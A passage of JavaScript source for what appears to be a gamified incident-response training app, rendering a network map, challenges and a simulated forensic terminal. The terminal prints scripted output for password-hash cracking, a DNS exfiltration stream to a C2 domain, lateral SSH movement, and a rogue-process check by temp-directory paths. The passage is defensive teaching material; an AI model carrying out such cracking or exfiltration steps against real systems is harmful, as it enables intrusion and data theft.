    host.appendChild(el);
    setTimeout(() => {
      if (el.parentNode) el.remove();
    }, 3600);
  }

  function escapeHtml(str) {
    return String(str)
      .replace(/&/g, "&amp;")
      .replace(/</g, "&lt;")
      .replace(/>/g, "&gt;")
      .replace(/"/g, "&quot;");
  }

  // =========================================================================
  // 6. RENDERING ENGINE: HEADER, BRIEFING, CHALLENGES, ACHIEVEMENTS, MAP
  // =========================================================================
  function renderAll() {
    if (!state.scenario) return;
    renderTopBar();
    renderNavBadges();
    renderIsometricNetwork();
    renderNodeInspector();
    renderBriefing();
    renderActiveChallenges();
    renderAchievements();
    renderSubViews();
  }

  function renderTopBar() {
    const sc = state.scenario;
    const solvedCount = sc.challenges.filter(c => c.solved).length;
    const totalCount = sc.challenges.length;

    const codeEl = document.getElementById("zh-op-code");
    const titleEl = document.getElementById("zh-op-title");
    const descEl = document.getElementById("zh-op-desc");
    const diffEl = document.getElementById("zh-difficulty-label");
    const segsEl = document.getElementById("zh-progress-segs");
    const progText = document.getElementById("zh-progress-text");
    const xpEl = document.getElementById("zh-xp-val");
    const highEl = document.getElementById("zh-highscore-val");
    const highPill = document.getElementById("zh-highscore-pill");

    if (codeEl) codeEl.textContent = sc.op.code + " // SEED #" + sc.seed;
    if (titleEl) titleEl.textContent = sc.op.title;
    if (descEl) descEl.textContent = sc.op.subtitle;
    if (diffEl) diffEl.textContent = sc.difficulty;
    if (progText) progText.textContent = `${solvedCount} / ${totalCount}`;
    if (xpEl) xpEl.textContent = `${state.xp} XP`;
    if (highEl) highEl.textContent = `HIGH: ${state.highScore} XP`;
    if (highPill) {
      highPill.title = `Saved in Cookies — High Score: ${state.highScore} XP | Career Total: ${state.lifetimeXp} XP | Operations Completed: ${state.opsCompleted}`;
    }

    if (segsEl) {
      let html = "";
      for (let i = 0; i < totalCount; i++) {
        html += `<span class="zh-seg ${i < solvedCount ? "filled" : ""}"></span>`;
      }
      segsEl.innerHTML = html;
    }
  }

  function renderNavBadges() {
    const sc = state.scenario;
    const unsolved = sc.challenges.filter(c => !c.solved).length;
    const chalBadge = document.getElementById("zh-badge-challenges");
    if (chalBadge) chalBadge.textContent = unsolved > 0 ? String(unsolved) : "✓";

    const alertsCount = Object.values(sc.nodes).filter(n => n.status === "compromised" && !n.isolated).length;
    const netStatAlerts = document.getElementById("zh-net-stat-alerts");
    if (netStatAlerts) netStatAlerts.textContent = String(alertsCount);
    const netStatAlertsPill = document.getElementById("zh-net-stat-alerts-pill");
    if (netStatAlertsPill) netStatAlertsPill.textContent = String(alertsCount);
  }

  // Render the 3D Isometric Network Map SVG with live procedural states
  function renderIsometricNetwork() {
    const sc = state.scenario;
    const svgContainer = document.getElementById("zh-iso-map-Mount");
    if (!svgContainer) return;

    const pivotId = sc.pivot.pivotNode;
    const webIsolated = sc.nodes.WEB.isolated;
    const pivotIsolated = sc.nodes[pivotId].isolated;

    // Coordinates for Isometric Nodes on 900x520 viewBox
    const coords = {
      INTERNET: { x: 645, y: 112 },
      CORE: { x: 440, y: 238 },
      WEB: { x: 245, y: 205 },
      DB: { x: 335, y: 365 },
      DEV: { x: 615, y: 265 },
      ADMIN: { x: 550, y: 385 }
    };

    const getLineClass = (targetId) => {
      if (sc.nodes[targetId] && sc.nodes[targetId].isolated) return "";
      if (targetId === "WEB" || targetId === pivotId) return "zh-flow-alert";
      return "zh-flow-line";
    };

    const getLineColor = (targetId) => {
      if (sc.nodes[targetId] && sc.nodes[targetId].isolated) return "#10b981";
      if (targetId === "WEB" || targetId === pivotId) return "#ff2a5f";
      return "#00e5ff";
    };

    svgContainer.innerHTML = `
      <svg class="zh-iso-svg" viewBox="0 0 900 520" preserveAspectRatio="xMidYMid slice" xmlns="http://www.w3.org/2000/svg">
        <defs>
          <radialGradient id="zhFloorGlow" cx="50%" cy="50%" r="50%">
            <stop offset="0%" stop-color="#00b4ff" stop-opacity="0.22"/>
            <stop offset="65%" stop-color="#04152d" stop-opacity="0.08"/>
            <stop offset="100%" stop-color="#02060d" stop-opacity="0"/>
          </radialGradient>
          <linearGradient id="zhCubeTop" x1="0%" y1="0%" x2="100%" y2="100%">
            <stop offset="0%" stop-color="#00e5ff" stop-opacity="0.55"/>
            <stop offset="100%" stop-color="#0284c7" stop-opacity="0.25"/>
          </linearGradient>
          <linearGradient id="zhCubeLeft" x1="0%" y1="0%" x2="0%" y2="100%">
            <stop offset="0%" stop-color="#09264a"/>
            <stop offset="100%" stop-color="#041022"/>
          </linearGradient>
          <linearGradient id="zhCubeRight" x1="0%" y1="0%" x2="0%" y2="100%">
            <stop offset="0%" stop-color="#0d3562"/>
            <stop offset="100%" stop-color="#061831"/>
          </linearGradient>
          <filter id="zhNeonGlow" x="-30%" y="-30%" width="160%" height="160%">
            <feGaussianBlur stdDeviation="4" result="blur" />
            <feComposite in="SourceGraphic" in2="blur" operator="over"/>
          </filter>
        </defs>

        <!-- Ambient Floor Glow -->
        <ellipse cx="450" cy="275" rx="390" ry="210" fill="url(#zhFloorGlow)" />

        <!-- Isometric City Grid Lines -->
        <g stroke="rgba(0, 210, 255, 0.08)" stroke-width="1">
          <line x1="120" y1="260" x2="460" y2="85" />
          <line x1="180" y1="295" x2="520" y2="120" />
          <line x1="240" y1="330" x2="580" y2="155" />
          <line x1="300" y1="365" x2="640" y2="190" />
          <line x1="360" y1="400" x2="700" y2="225" />
          <line x1="420" y1="435" x2="760" y2="260" />
          <line x1="480" y1="470" x2="820" y2="295" />

          <line x1="460" y1="85" x2="810" y2="275" />
          <line x1="400" y1="120" x2="750" y2="310" />
          <line x1="340" y1="155" x2="690" y2="345" />
          <line x1="280" y1="190" x2="630" y2="380" />
          <line x1="220" y1="225" x2="570" y2="415" />
          <line x1="160" y1="260" x2="510" y2="450" />
        </g>

        <!-- Background Isometric Dark Datacenter Blocks (Atmosphere) -->
        <g fill="#051122" stroke="rgba(0, 210, 255, 0.14)" stroke-width="0.8">
          <polygon points="370,115 400,100 430,115 400,130" />
          <polygon points="370,115 400,130 400,175 370,160" />
          <polygon points="430,115 400,130 400,175 430,160" />

          <polygon points="150,285 185,268 220,285 185,302" />
          <polygon points="150,285 185,302 185,345 150,328" />
          <polygon points="220,285 185,302 185,345 220,328" />

          <polygon points="695,315 730,298 765,315 730,332" />
          <polygon points="695,315 730,332 730,375 695,358" />
          <polygon points="765,315 730,332 730,375 765,358" />
        </g>

        <!-- NETWORK CIRCUIT CONNECTIONS -->
        <!-- INTERNET -> CORE Breach Beam -->
        <path d="M ${coords.INTERNET.x} ${coords.INTERNET.y + 18} L 540 168 L ${coords.CORE.x} ${coords.CORE.y - 25}"
              fill="none" stroke="${webIsolated && pivotIsolated ? "#10b981" : "#ff2a5f"}" stroke-width="3"
              class="${webIsolated && pivotIsolated ? "zh-flow-line" : "zh-flow-alert"}" />

        <!-- Warning Triangle on INTERNET -> CORE line -->
        <g transform="translate(536, 152)" style="cursor:pointer" data-node="INTERNET">
          <polygon points="0,-16 15,10 -15,10" fill="rgba(255,42,95,0.25)" stroke="#ff2a5f" stroke-width="2" />
          <text x="0" y="7" text-anchor="middle" fill="#ffffff" font-size="12" font-weight="800" font-family="monospace">!</text>
        </g>

        <!-- CORE -> WEB -->
        <path d="M ${coords.CORE.x - 36} ${coords.CORE.y + 4} L 345 245 L ${coords.WEB.x + 25} ${coords.WEB.y + 15}"
              fill="none" stroke="${getLineColor("WEB")}" stroke-width="2.6" class="${getLineClass("WEB")}" />

        <!-- CORE -> DB -->
        <path d="M ${coords.CORE.x - 24} ${coords.CORE.y + 28} L 395 318 L ${coords.DB.x + 20} ${coords.DB.y - 10}"
              fill="none" stroke="${getLineColor("DB")}" stroke-width="2.6" class="${getLineClass("DB")}" />

        <!-- CORE -> DEV -->
        <path d="M ${coords.CORE.x + 36} ${coords.CORE.y + 6} L 535 232 L ${coords.DEV.x - 25} ${coords.DEV.y + 5}"
              fill="none" stroke="${getLineColor("DEV")}" stroke-width="2.6" class="${getLineClass("DEV")}" />

        <!-- CORE -> ADMIN -->
        <path d="M ${coords.CORE.x + 22} ${coords.CORE.y + 30} L 495 335 L ${coords.ADMIN.x - 25} ${coords.ADMIN.y - 5}"
              fill="none" stroke="${getLineColor("ADMIN")}" stroke-width="2.6" class="${getLineClass("ADMIN")}" />

        <!-- 1. INTERNET CLOUD NODE -->
        <g class="zh-iso-node" data-node="INTERNET" transform="translate(${coords.INTERNET.x}, ${coords.INTERNET.y})">
          <ellipse cx="0" cy="18" rx="68" ry="24" fill="rgba(0, 229, 255, 0.14)" stroke="#00e5ff" stroke-width="1.5" filter="url(#zhNeonGlow)" />
          <path d="M-42,12 C-58,12 -64,-5 -48,-14 C-44,-30 -18,-34 -8,-22 C4,-34 32,-30 36,-12 C54,-10 56,12 38,12 Z"
                fill="rgba(7, 28, 56, 0.92)" stroke="#00e5ff" stroke-width="2" filter="url(#zhNeonGlow)" />
          <circle cx="0" cy="-6" r="13" fill="none" stroke="#5ceeff" stroke-width="1.2" />
          <ellipse cx="0" cy="-6" rx="7" ry="13" fill="none" stroke="#5ceeff" stroke-width="1" />
          <line x1="-13" y1="-6" x2="13" y2="-6" stroke="#5ceeff" stroke-width="1" />
          <text x="0" y="23" text-anchor="middle" fill="#ffffff" font-family="Montserrat, sans-serif" font-size="11" font-weight="700" letter-spacing="1.5">INTERNET</text>
          <text x="0" y="36" text-anchor="middle" fill="#ff6b8b" font-family="monospace" font-size="10">${sc.actor.ip}</text>
        </g>

        <!-- 2. CORE ROUTER TOWER (10.10.0.1) -->
        ${renderIsoBuildingSVG("CORE", coords.CORE.x, coords.CORE.y, 46, 58, sc.nodes.CORE, state.selectedNodeId === "CORE")}

        <!-- 3. WEB SERVER CLUSTER (10.10.1.0/24) -->
        ${renderIsoBuildingSVG("WEB", coords.WEB.x, coords.WEB.y, 38, 46, sc.nodes.WEB, state.selectedNodeId === "WEB")}

        <!-- 4. DB CYLINDER CLUSTER (10.10.2.0/24) -->
        ${renderIsoBuildingSVG("DB", coords.DB.x, coords.DB.y, 38, 44, sc.nodes.DB, state.selectedNodeId === "DB")}

        <!-- 5. DEV WORKSTATION SUBNET (10.10.3.0/24) -->
        ${renderIsoBuildingSVG("DEV", coords.DEV.x, coords.DEV.y, 38, 42, sc.nodes.DEV, state.selectedNodeId === "DEV")}

        <!-- 6. ADMIN BASTION SUBNET (10.10.4.0/24) -->
        ${renderIsoBuildingSVG("ADMIN", coords.ADMIN.x, coords.ADMIN.y, 38, 42, sc.nodes.ADMIN, state.selectedNodeId === "ADMIN")}
      </svg>
    `;

    // Attach click listeners to all isometric nodes
    svgContainer.querySelectorAll("[data-node]").forEach(el => {
      el.addEventListener("click", () => {
        if (window.getSelection && window.getSelection().toString().trim().length > 0) return;
        const nodeId = el.getAttribute("data-node");
        if (nodeId && sc.nodes[nodeId]) {
          SoundFX.play("click");
          if (state.selectedNodeId !== nodeId) {
            state.selectedNodeId = nodeId;
            renderIsometricNetwork();
            renderNodeInspector();
          }
        }
      });
    });
  }

  function renderIsoBuildingSVG(id, cx, cy, size, height, nodeObj, isSelected) {
    const isCompromised = nodeObj.status === "compromised" && !nodeObj.isolated;
    const isIsolated = nodeObj.isolated;
    const accent = isIsolated ? "#10b981" : isCompromised ? "#ff2a5f" : "#00e5ff";
    const baseStroke = isSelected ? "#ffffff" : accent;

    // Platform diamond
    const pw = size * 1.45;
    const ph = size * 0.78;

    // 3D Isometric Cube coordinates
    const w = size * 0.95;
    const h = size * 0.5;
    const topY = cy - height;

    return `
      <g class="zh-iso-node" data-node="${id}">
        <!-- Glowing Base Platform -->
        <polygon points="${cx},${cy - ph} ${cx + pw},${cy} ${cx},${cy + ph} ${cx - pw},${cy}"
                 fill="rgba(4, 18, 38, 0.9)" stroke="${baseStroke}" stroke-width="${isSelected ? 2.5 : 1.6}"
                 filter="url(#zhNeonGlow)" />
        <polygon points="${cx},${cy - ph + 5} ${cx + pw - 8},${cy} ${cx},${cy + ph - 5} ${cx - pw + 8},${cy}"
                 fill="none" stroke="${accent}" stroke-width="0.9" stroke-opacity="0.6" />

        <!-- 3D Server Tower Left Face -->
        <polygon points="${cx - w},${topY} ${cx},${topY + h} ${cx},${cy + h * 0.4} ${cx - w},${cy - h * 0.6}"
                 fill="url(#zhCubeLeft)" stroke="${accent}" stroke-width="1.2" />
        <!-- 3D Server Tower Right Face -->
        <polygon points="${cx + w},${topY} ${cx},${topY + h} ${cx},${cy + h * 0.4} ${cx + w},${cy - h * 0.6}"
                 fill="url(#zhCubeRight)" stroke="${accent}" stroke-width="1.2" />
        <!-- 3D Server Tower Roof -->
        <polygon points="${cx},${topY - h} ${cx + w},${topY} ${cx},${topY + h} ${cx - w},${topY}"
                 fill="url(#zhCubeTop)" stroke="${baseStroke}" stroke-width="1.5" />

        <!-- Glowing Server Rack LEDs -->
        <line x1="${cx - w * 0.65}" y1="${topY + 12}" x2="${cx - w * 0.2}" y2="${topY + h + 6}" stroke="${accent}" stroke-width="2" />
        <line x1="${cx - w * 0.65}" y1="${topY + 22}" x2="${cx - w * 0.2}" y2="${topY + h + 16}" stroke="${accent}" stroke-width="2" />
        <line x1="${cx + w * 0.2}" y1="${topY + h + 6}" x2="${cx + w * 0.65}" y2="${topY + 12}" stroke="${accent}" stroke-width="2" />
        <line x1="${cx + w * 0.2}" y1="${topY + h + 16}" x2="${cx + w * 0.65}" y2="${topY + 22}" stroke="${accent}" stroke-width="2" />

        <!-- Node Callout Label -->
        <g transform="translate(${cx}, ${topY - h - 18})">
          <rect x="-54" y="-22" width="108" height="32" rx="4" fill="rgba(4, 12, 26, 0.92)" stroke="${baseStroke}" stroke-width="1.2" />
          <text x="0" y="-8" text-anchor="middle" fill="#ffffff" font-family="Montserrat, sans-serif" font-size="11.5" font-weight="800">${nodeObj.label}${isIsolated ? " [LOCKED]" : ""}</text>
          <text x="0" y="5" text-anchor="middle" fill="${accent}" font-family="monospace" font-size="9.5">${nodeObj.subnet}</text>
        </g>
      </g>
    `;
  }

  function renderNodeInspector() {
    const sc = state.scenario;
    const node = sc.nodes[state.selectedNodeId] || sc.nodes.WEB;
    const el = document.getElementById("zh-node-inspector");
    if (!el) return;

    const statusBadge = node.isolated
      ? `<span style="color:#34d399;font-family:var(--zh-font-mono);font-size:10.5px;">● ISOLATED</span>`
      : node.status === "compromised" || node.status === "alert"
      ? `<span style="color:#ff2a5f;font-family:var(--zh-font-mono);font-size:10.5px;">▲ ALERT / BREACH</span>`
      : `<span style="color:#00e5ff;font-family:var(--zh-font-mono);font-size:10.5px;">● ONLINE</span>`;

    el.innerHTML = `
      <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:6px;border-bottom:1px solid rgba(0,229,255,0.2);padding-bottom:5px;">
        <div>
          <strong style="color:#fff;font-family:var(--zh-font-display);font-size:12px;">NODE // ${node.label}</strong>
          <span style="color:var(--zh-cyan);font-family:var(--zh-font-mono);font-size:11px;margin-left:6px;">${node.ip}</span>
        </div>
        ${statusBadge}
      </div>
      <div style="font-size:11px;color:var(--zh-text-Sub);margin-bottom:8px;">${node.role}</div>
      <div style="display:flex;gap:6px;flex-wrap:wrap;">
        <button class="zh-chip" id="zh-ins-scan">Nmap Scan</button>
        <button class="zh-chip" id="zh-ins-procs">Processes</button>
        <button class="zh-chip" id="zh-ins-isolate" style="border-color:${node.isolated ? "#10b981" : "#ff2a5f"};color:${node.isolated ? "#34d399" : "#ff8da3"};">
          ${node.isolated ? "Un-Isolate Host" : "Isolate Host (Firewall)"}
        </button>
      </div>
    `;

    el.querySelector("#zh-ins-scan").onclick = () => {
      runTerminalCommand("nmap -sV " + node.subnet);
    };
    el.querySelector("#zh-ins-procs").onclick = () => {
      runTerminalCommand("ps aux @" + node.id);
    };
    el.querySelector("#zh-ins-isolate").onclick = () => {
      runTerminalCommand("isolate " + node.id);
    };
  }

  function renderBriefing() {
    const sc = state.scenario;
    const listEl = document.getElementById("zh-briefing-objectives");
    if (!listEl) return;

    const milestones = [
      { label: "Find the source of the suspicious traffic", done: sc.challenges[0].solved, cid: "c1" },
      { label: "Identify what was accessed & rogue service", done: sc.challenges[1].solved && sc.challenges[4].solved, cid: "c2" },
      { label: "Determine the attack & lateral pivot method", done: sc.challenges[2].solved && sc.challenges[3].solved, cid: "c3" },
      { label: "Contain breach & collect evidence for report", done: sc.challenges[6].solved && sc.challenges[7].solved, cid: "c8" }
    ];

    listEl.innerHTML = milestones.map(m => `
      <li class="zh-obj-item ${m.done ? "done" : ""}" data-cid="${m.cid}">
        <span class="zh-obj-circle">${m.done ? "✓" : ""}</span>
        <span>${m.label}</span>
      </li>
    `).join("");

    listEl.querySelectorAll(".zh-obj-item").forEach(item => {
      item.onclick = () => {
        if (window.getSelection && window.getSelection().toString().trim().length > 0) return;
        const cid = item.getAttribute("data-cid");
        openChallengeModal(cid);
      };
    });
  }

  function renderActiveChallenges() {
    const sc = state.scenario;
    const grid = document.getElementById("zh-overview-challenges");
    if (!grid) return;

    const startIdx = (state.challengePage * 3) % sc.challenges.length;
    const visible = [];
    for (let i = 0; i < 3; i++) {
      visible.push(sc.challenges[(startIdx + i) % sc.challenges.length]);
    }

    grid.innerHTML = visible.map(ch => `
      <div class="zh-challenge-card ${ch.solved ? "solved" : ""}" data-cid="${ch.id}">
        <div>
          <h4>
            <span>${ch.num}. ${ch.title}</span>
            ${ch.solved ? `<span style="color:#34d399;font-size:12px;">✓ SOLVED</span>` : ""}
          </h4>
          <p>${ch.desc}</p>
        </div>
        <div class="zh-challenge-meta">
          <span class="zh-badge-cat">${ch.category}</span>
          <span class="zh-xp-tag">★ ${ch.xp} XP</span>
        </div>
      </div>
    `).join("");

    grid.querySelectorAll(".zh-challenge-card").forEach(card => {
      card.onclick = () => {
        if (window.getSelection && window.getSelection().toString().trim().length > 0) return;
        SoundFX.play("click");
        openChallengeModal(card.getAttribute("data-cid"));
      };
    });
  }

  function renderAchievements() {
    const a = state.achievements;
    const listEl = document.getElementById("zh-achievements-mount");
    if (!listEl) return;

    const items = [
      { id: "first_blood", title: "First Blood", desc: "Find your first open rogue port", unlocked: a.first_blood },
      { id: "log_analyzer", title: "Log Analyzer", desc: "Identify a suspicious exploit or process", unlocked: a.log_analyzer },
      { id: "network_detective", title: "Network Detective", desc: "Map lateral movement & isolate host", unlocked: a.network_detective },
      { id: "full_compromise", title: "Full Compromise", desc: "Find all flags & reconstruct incident", unlocked: a.full_compromise }
    ];

    listEl.innerHTML = items.map(it => `
      <div class="zh-ach-item ${it.unlocked ? "unlocked" : ""}">
        <div class="zh-ach-icon">${it.unlocked ? "✓" : ""}</div>
        <div>
          <div class="zh-ach-title">${it.title}</div>
          <div class="zh-ach-desc">${it.desc}</div>
        </div>
      </div>
    `).join("");
  }

  // =========================================================================
  // 7. INTERACTIVE TERMINAL EMULATOR
  // =========================================================================
  function clearTerminal() {
    const out = document.getElementById("zh-term-output");
    if (out) out.innerHTML = "";
  }

  function printTerminalLine(text, style = "") {
    const out = document.getElementById("zh-term-output");
    if (!out) return;
    const div = document.createElement("div");
    div.className = "zh-term-line";
    if (style) div.setAttribute("style", style);
    div.textContent = text;
    out.appendChild(div);
    out.scrollTop = out.scrollHeight;
  }

  function printTerminalHTML(html) {
    const out = document.getElementById("zh-term-output");
    if (!out) return;
    const div = document.createElement("div");
    div.className = "zh-term-line";
    div.innerHTML = html;
    out.appendChild(div);
    out.scrollTop = out.scrollHeight;
  }

  function runTerminalCommand(rawCmd, silentPrompt = false) {
    const cmdStr = rawCmd.trim();
    if (!cmdStr) return;

    const sc = state.scenario;
    if (!silentPrompt) {
      state.cmdHistory.push(cmdStr);
      state.cmdIndex = state.cmdHistory.length;
      saveState();
      printTerminalHTML(
        `<span class="zh-term-prompt-user">root@zerohour:~#</span> <span class="zh-term-cmd">${escapeHtml(cmdStr)}</span>`
      );
    }

    const parts = cmdStr.split(/\s+/);
    const base = parts[0].toLowerCase();
    const argStr = parts.slice(1).join(" ");

    if (base === "help") {
      printTerminalLine("Available Cyber Operations Commands:", "color:#00e5ff;font-weight:700");
      printTerminalLine("  nmap -sV <subnet/node>   Scan open ports & service versions (e.g. nmap -sV 10.10.1.0/24)");
      printTerminalLine("  grep <term> access.log   Filter web server HTTP logs for exploits or IPs");
      printTerminalLine("  ps aux [@NODE]           Inspect running processes on WEB, DB, DEV, ADMIN");
      printTerminalLine("  netstat -tulnp           Show active network sockets & lateral SSH pivots");
      printTerminalLine("  john / hashcat           Crack leaked credential hash from /var/backups/creds.dump");
      printTerminalLine("  wireshark / pcap         Inspect captured packet stream & DNS exfiltration");
      printTerminalLine("  openssl s_client         Inspect attacker C2 TLS certificate & attribution");
      printTerminalLine("  isolate <NODE>           Isolate compromised node at firewall (e.g. isolate " + sc.pivot.pivotNode + ")");
      printTerminalLine("  report                   Open the final Incident Report submission builder");
      printTerminalLine("  reroll                   Generate a brand-new procedural cyber incident operation");
      printTerminalLine("  clear                    Clear terminal output");
      return;
    }

    if (base === "clear") {
      clearTerminal();
      return;
    }

    if (base === "reroll") {
      startNewOperation();
      return;
    }

    if (base === "nmap") {
      SoundFX.play("scan");
      let targetNode = sc.nodes.WEB;
      const up = argStr.toUpperCase();
      if (up.includes("10.10.2") || up.includes("DB")) targetNode = sc.nodes.DB;
      else if (up.includes("10.10.3") || up.includes("DEV")) targetNode = sc.nodes.DEV;
      else if (up.includes("10.10.4") || up.includes("ADMIN")) targetNode = sc.nodes.ADMIN;
      else if (up.includes("10.10.0") || up.includes("CORE")) targetNode = sc.nodes.CORE;

      printTerminalLine("Starting Nmap 7.95 ( https://nmap.org ) on " + targetNode.subnet + " ..");
      printTerminalLine("PORT       STATE   SERVICE              VERSION", "color:#94b8d7;font-weight:700");
      targetNode.ports.forEach(p => {
        const line = `${(p.port + "/" + p.proto).padEnd(10)} ${p.state.padEnd(7)} ${p.service.padEnd(20)} ${p.version}`;
        printTerminalLine(line, p.suspicious ? "color:#ff2a5f;font-weight:700" : "color:#e2f1ff");
      });
      printTerminalLine("Nmap done: 256 IP addresses (4 hosts up) scanned in 0.42 seconds");

      if (targetNode.id === "WEB" && !silentPrompt) {
        solveChallenge("c2", "Discovered rogue port " + sc.hiddenSvc.port + "/tcp (" + sc.hiddenSvc.service + ")");
      }
      return;
    }

    if (base === "grep" || base === "cat" || base === "logs") {
      SoundFX.play("scan");
      printTerminalLine("--- /var/log/nginx/access.log (Filtered Forensic View) ---", "color:#00e5ff");
      sc.logs.forEach(l => {
        if (l.suspicious || argStr.includes("all")) {
          printTerminalLine(
            `[${l.time}] ${l.src} -> ${l.dst} ${l.method} ${l.uri} (${l.status}) // ${l.note}`,
            l.suspicious ? "color:#ff6b8b" : "color:#94b8d7"
          );
        }
      });
      solveChallenge("c1", "Identified attacker IP " + sc.actor.ip + " & " + sc.exploit.name);
      return;
    }

    if (base === "ps" || base === "top") {
      let targetNode = sc.nodes[state.selectedNodeId] || sc.nodes.WEB;
      const up = argStr.toUpperCase();
      ["WEB", "DB", "DEV", "ADMIN", "CORE"].forEach(k => {
        if (up.includes(k)) targetNode = sc.nodes[k];
      });
      printTerminalLine("Active Processes on " + targetNode.label + " (" + targetNode.ip + "):", "color:#00e5ff");
      targetNode.processes.forEach(pr => {
        const isRogue = pr.includes("/tmp/") || pr.includes("/var/tmp/") || pr.includes("/dev/shm") || pr.includes("/opt/.");
        printTerminalLine("  " + pr, isRogue ? "color:#ff2a5f;font-weight:700" : "");
      });
      if (targetNode.id === "WEB") {
        solveChallenge("c2", "Identified rogue process " + sc.hiddenSvc.process);
      }
      return;
    }

    if (base === "netstat" || base === "ss") {
      printTerminalLine("Active Internet & Internal Pivot Connections (netstat -tulnp):", "color:#00e5ff");
      printTerminalLine(`tcp  0  0 ${sc.webHostIp}:${sc.hiddenSvc.port}   ${sc.actor.ip}:443     ESTABLISHED (${sc.hiddenSvc.process})`, "color:#ff2a5f");
      printTerminalLine(`tcp  0  0 ${sc.webHostIp}:51422   ${sc.pivot.pivotIp}:22      ESTABLISHED (ssh -> ${sc.pivot.pivotNode} via ${sc.pivot.lateralMethod})`, "color:#fbbf24");
      solveChallenge("c3", "Traced lateral movement from WEB to " + sc.pivot.pivotNode + " (" + sc.pivot.pivotIp + ")");
      return;
    }

    if (base === "john" || base === "hashcat") {
      SoundFX.play("scan");
      printTerminalLine("Loaded 1 password hash (" + sc.cred.algo + ") from /var/backups/creds.dump:");
      printTerminalLine("  " + sc.cred.user + ":" + sc.cred.hash, "color:#94b8d7");
      printTerminalLine("Running dictionary + rule attack against hash...");
      printTerminalLine(`[+] CRACKED! ${sc.cred.user} -> ${sc.cred.plaintext}`, "color:#34d399;font-weight:700");
      solveChallenge("c4", "Cracked password `" + sc.cred.plaintext + "` for " + sc.cred.user);
      return;
    }

    if (base === "wireshark" || base === "pcap" || base === "dig" || base === "strings") {
      SoundFX.play("scan");
      printTerminalLine("Inspecting captured DNS TXT & TCP Exfiltration Stream from " + sc.pivot.pivotIp + ":", "color:#00e5ff");
      printTerminalLine("  Query: TXT exfil." + sc.actor.c2Domain);
      printTerminalLine("  Payload (Base64): " + sc.base64Clue, "color:#94b8d7");
      printTerminalLine("  Decoded Stream:   EXFIL_TARGET=" + sc.pivot.targetAsset + " | FLAG=" + sc.flagCode, "color:#34d399;font-weight:700");
      solveChallenge("c5", "Decoded exfiltrated asset " + sc.pivot.targetAsset + " (" + sc.flagCode + ")");
      return;
    }

    if (base === "openssl" || base === "whois" || base === "curl") {
      SoundFX.play("scan");
      printTerminalLine("Connecting to remote C2 endpoint " + sc.actor.ip + ":443 ...", "color:#00e5ff");
      printTerminalLine("  Subject: CN=" + sc.actor.c2Domain + ", O=" + sc.actor.name);
      printTerminalLine("  Origin Geo: " + sc.actor.country + " (" + sc.actor.asn + ")");
      solveChallenge("c6", "Attributed C2 domain " + sc.actor.c2Domain + " to " + sc.actor.name);
      return;
    }

    if (base === "isolate" || base === "block" || base === "ufw" || base === "iptables") {
      let targetKey = sc.pivot.pivotNode;
      const up = argStr.toUpperCase();
      ["WEB", "DB", "DEV", "ADMIN", "CORE", "INTERNET"].forEach(k => {
        if (up.includes(k)) targetKey = k;
      });
      const node = sc.nodes[targetKey];
      node.isolated = !node.isolated;
      printTerminalLine(
        node.isolated
          ? `[+] FIREWALL RULE APPLIED: Host ${node.label} (${node.ip}) is now ISOLATED from outbound C2 traffic.`
          : `[-] Firewall isolation lifted for ${node.label}.`,
        "color:#34d399;font-weight:700"
      );
      if (node.isolated && (targetKey === sc.pivot.pivotNode || targetKey === "WEB" || targetKey === "INTERNET")) {
        solveChallenge("c7", "Isolated compromised host " + node.label + " at firewall");
      } else {
        saveState();
        renderAll();
      }
      return;
    }

    if (base === "report" || base === "submit") {
      openIncidentReportModal();
      return;
    }

    printTerminalLine(
      `Command '${base}' not recognized. Type 'help' for forensic commands (nmap, grep, ps, netstat, john, wireshark, openssl, isolate, report).`,
      "color:#ff6b8b"
    );
  }

  // =========================================================================
  // 8. DEDICATED SUB-VIEWS (INTEL, LOGS, CHALLENGES, SETTINGS)
  // =========================================================================
  function switchNavigation(navId) {
    SoundFX.play("click");
    state.activeNav = navId;

    document.querySelectorAll(".zh-nav-btn").forEach(btn => {
      btn.classList.toggle("active", btn.getAttribute("data-nav") === navId);
    });

    const overviewEl = document.getElementById("zh-view-OVERVIEW");
    const subviewEl = document.getElementById("zh-view-SUBVIEW");

    if (navId === "OVERVIEW") {
      if (overviewEl) overviewEl.style.display = "grid";
      if (subviewEl) subviewEl.classList.remove("active");
    } else {
      if (overviewEl) overviewEl.style.display = "none";
      if (subviewEl) {
        subviewEl.classList.add("active");
        renderSubViews();
      }
    }
  }

  function renderSubViews() {
    const mount = document.getElementById("zh-subview-content");
    if (!mount || state.activeNav === "OVERVIEW") return;

    const sc = state.scenario;
    const nav = state.activeNav;

    if (nav === "INTEL") {
      mount.innerHTML = `
        <div class="zh-panel" style="padding:18px;">
          <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:14px;">
            <h3 style="color:var(--zh-cyan);font-family:var(--zh-font-display);margin:0;">THREAT INTELLIGENCE & EVIDENCE DOSSIER // SEED #${sc.seed}</h3>
            <button class="zh-btn-primary" id="zh-intel-run-tls">Run OpenSSL C2 Probe</button>
          </div>
          <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:14px;">
            <div class="zh-challenge-card">
              <h4>1. Threat Actor Attribution</h4>
              <p><strong>Suspected APT:</strong> <span style="color:#fff">${sc.actor.name}</span><br>
                 <strong>External C2 IP:</strong> <span style="color:#ff6b8b;font-family:monospace">${sc.actor.ip}</span><br>
                 <strong>Origin Relay:</strong> ${sc.actor.country}<br>
                 <strong>ASN:</strong> ${sc.actor.asn}<br>
                 <strong>C2 Domain:</strong> <span style="color:var(--zh-cyan);font-family:monospace">${sc.actor.c2Domain}</span></p>
              <span class="zh-badge-cat">C2 ATTRIBUTION</span>
            </div>
            <div class="zh-challenge-card">
              <h4>2. Initial Breach Vector</h4>
              <p><strong>Vulnerability:</strong> <span style="color:#fff">${sc.exploit.name}</span><br>
                 <strong>Target URI:</strong> <code style="color:#fbbf24;word-break:break-all">${escapeHtml(sc.exploit.uri)}</code><br>
                 <strong>HTTP Header Clue:</strong> <code style="color:var(--zh-cyan)">${escapeHtml(sc.exploit.headerClue)}</code><br>
                 <strong>Summary:</strong> ${sc.exploit.vulnSummary}</p>
              <span class="zh-badge-cat">INITIAL ACCESS</span>
            </div>
            <div class="zh-challenge-card">
              <h4>3. Persistence & Lateral Pivot</h4>
              <p><strong>Rogue Service:</strong> Port <span style="color:#ff6b8b;font-family:monospace">${sc.hiddenSvc.port}/tcp</span> (${sc.hiddenSvc.service})<br>
